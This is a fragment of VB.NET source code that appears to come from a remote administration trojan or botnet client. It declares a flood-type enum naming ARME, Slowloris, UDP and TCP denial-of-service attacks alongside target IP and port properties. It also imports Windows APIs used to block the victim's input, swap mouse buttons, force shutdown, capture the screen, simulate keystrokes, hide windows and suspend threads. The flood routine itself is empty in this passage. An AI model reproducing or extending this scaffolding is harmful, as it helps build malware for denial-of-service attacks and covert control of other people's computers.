    Public Sub StartTCP()

    End Sub

#Region "Properties"
    Private _Port As Integer
    Public Property Port As Integer
        Get
            Return _Port
        End Get
        Set(ByVal value As Integer)
            _Port = value
        End Set
    End Property
    Private _IP As String
    Public Property IP As String
        Get
            Return _IP
        End Get
        Set(ByVal value As String)
            _IP = value
        End Set
    End Property
#End Region

    Public Enum FloodType
        ARME = 0
        SLOWLORIS = 1
        UDP = 2
        TCP = 3
    End Enum
End Class

#End Region

#Region " Native "
Public Module Native
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function GetWindow(ByVal hWnd As IntPtr, ByVal uCmd As UInteger) As IntPtr
    End Function
    <DllImport("winmm.dll")> _
    Public Function mciSendStringA(ByVal lpszCommand As String, ByVal lpszReturnString As String, ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
    End Function
    Public Declare Function ExitWindowsEx Lib "user32" (ByVal shutdownType As Integer, ByVal dwReserved As Integer) As Integer
    Public Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Int32
    Public Declare Function SendMessageA Lib "user32" (ByVal Hwnd As IntPtr, ByVal Message As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    Declare Sub MouseEvent Lib "user32" Alias "mouse_event" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
    Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
    Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hwnd As Int32, ByVal nclass As Int32, ByVal spz1 As String, ByVal spz2 As String) As Int32
    Declare Function EnableWindow Lib "user32" (ByVal hwnd As Int32, ByVal nOption As Int32) As Int32
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Integer, ByVal Msg As Integer, ByVal wParam As Integer, <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
    Public Delegate Function CallBack(ByVal hwnd As Integer, ByVal lParam As Integer) As Boolean
    Public Declare Function EnumWindows Lib "user32" (ByVal Adress As CallBack, ByVal y As Integer) As Integer
    Public Declare Function IsWindowVisible Lib "user32.dll" (ByVal hwnd As IntPtr) As Boolean
    Public Declare Auto Function SetCursorPos Lib "User32.dll" (ByVal X As Integer, ByVal Y As Integer) As Long
    Public Declare Auto Function GetCursorPos Lib "User32.dll" (ByRef lpPoint As Point) As Long
    Public Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Public Const MOUSEEVENTF_LEFTDOWN = &H2
    Public Const MOUSEEVENTF_LEFTUP = &H4
    Public Const MOUSEEVENTF_MIDDLEDOWN = &H20
    Public Const MOUSEEVENTF_MIDDLEUP = &H40
    Public Const MOUSEEVENTF_RIGHTDOWN = &H8
    Public Const MOUSEEVENTF_RIGHTUP = &H10
    Public Const MOUSEEVENTF_MOVE = &H1
    Public Declare Function CreateDC Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, ByVal lpInitData As String) As Integer
    Public Declare Function CreateCompatibleDC Lib "GDI32" (ByVal hDC As Integer) As Integer
    Public Declare Function CreateCompatibleBitmap Lib "GDI32" (ByVal hDC As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer) As Integer
    Public Declare Function GetDeviceCaps Lib "gdi32" Alias "GetDeviceCaps" (ByVal hdc As Integer, ByVal nIndex As Integer) As Integer
    Public Declare Function SelectObject Lib "GDI32" (ByVal hDC As Integer, ByVal hObject As Integer) As Integer
    Public Declare Function BitBlt Lib "GDI32" (ByVal srchDC As Integer, ByVal srcX As Integer, ByVal srcY As Integer, ByVal srcW As Integer, ByVal srcH As Integer, ByVal desthDC As Integer, ByVal destX As Integer, ByVal destY As Integer, ByVal op As Integer) As Integer
    Public Declare Function DeleteDC Lib "GDI32" (ByVal hDC As Integer) As Integer
    Public Declare Function DeleteObject Lib "GDI32" (ByVal hObj As Integer) As Integer
    Public FW, FH As Integer

    <StructLayout(LayoutKind.Sequential)> Public Structure ICONINFO
        Public fIcon As Boolean
        Public xHotspot As Int32
        Public yHotspot As Int32
        Public hbmMask As IntPtr
        Public hbmColor As IntPtr
    End Structure

    <StructLayout(LayoutKind.Sequential)> Public Structure CURSORINFO
        Public cbSize As Int32
        Public flags As Int32
        Public hCursor As IntPtr
        Public ptScreenPos As Point
    End Structure

    <DllImport("user32.dll", EntryPoint:="GetCursorInfo")> Public Function GetCursorInfo(ByRef pci As CURSORINFO) As Boolean
    End Function

    <DllImport("user32.dll", EntryPoint:="CopyIcon")> Public Function CopyIcon(ByVal hIcon As IntPtr) As IntPtr
    End Function

    <DllImport("user32.dll", EntryPoint:="GetIconInfo")> Public Function GetIconInfo(ByVal hIcon As IntPtr, ByRef piconinfo As ICONINFO) As Boolean
    End Function
    <DllImport("msvcrt.dll", CallingConvention:=CallingConvention.Cdecl)> _
    Public Function memcmp(Dest As IntPtr, Src As IntPtr, Length As Integer) As Integer
    End Function
    <DllImport("User32.dll", SetLastError:=False, CallingConvention:=CallingConvention.StdCall, _
         CharSet:=CharSet.Auto)> _
    Public Function MapVirtualKey(ByVal uCode As UInt32, ByVal uMapType As UInt32) As UInt32
    End Function
    Public Declare Sub keybd_event Lib "user32.dll" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Integer, ByVal dwExtraInfo As Integer)
    <DllImport("Kernel32.dll")> Public Function SuspendThread(ByVal hThread As IntPtr) As Int32
    End Function
    <DllImport("kernel32.dll")> Public Function OpenThread(ByVal dwDesiredAccess As Integer, ByVal bInheritHandle As Boolean, ByVal dwThreadId As Integer) As IntPtr
    End Function
    <DllImport("kernel32.dll")> Public Function ResumeThread(ByVal hThread As IntPtr) As Integer
    End Function

End Module
#End Region
